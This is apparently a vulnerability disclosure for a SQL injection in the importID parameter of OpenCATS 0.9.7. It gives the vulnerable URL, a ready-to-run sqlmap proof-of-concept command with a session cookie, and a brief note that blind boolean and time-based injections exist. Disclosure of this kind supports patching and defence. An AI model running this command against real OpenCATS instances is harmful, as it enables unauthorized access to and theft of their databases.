# Opencats-0.9.7-sql injection in importID
Date: 2022/12/24

Exploit Author: Sakura501

Vendor Homepage: https://www.opencats.org/

Software Link: https://github.com/opencats/OpenCATS

Version: 0.9.7

Tested on: Windows11/PHP7.3.4/MySQL5.7.26

## URL
`http://192.168.2.153/src/opencats/index.php?m=import&a=viewerrors&importID=1`

## sqlmap-POC
```
sqlmap -u "http://192.168.2.153/src/opencats/index.php?m=import&a=viewerrors&importID=1" --cookie="CATS=3vuotomfflasp6drb4vtimpkqc" --current-db  -p "importID" --flush-session
```

## Result-Show
It exists two sql injections, one is boolean-based blind injection, the other is time-based blind injection.

![image](https://user-images.githubusercontent.com/71068573/209432445-ae54e3c9-83de-424e-9037-dbac2efba773.png)

![image](https://user-images.githubusercontent.com/71068573/209432499-4e6f1fa2-1754-43ca-8dab-698683aa75e8.png)

![image](https://user-images.githubusercontent.com/71068573/209432511-88339329-523c-4fa0-ae34-fee2747c5e36.png)

## Source-Code-Analysis
**Because it does not have strict control over input, then it is executed.**
![image](https://user-images.githubusercontent.com/71068573/209432838-e89cfd21-8cfe-4e71-8cc5-088bdae29063.png)

![image](https://user-images.githubusercontent.com/71068573/209432841-36bc5a14-21f4-4877-a2e6-538d36759861.png)

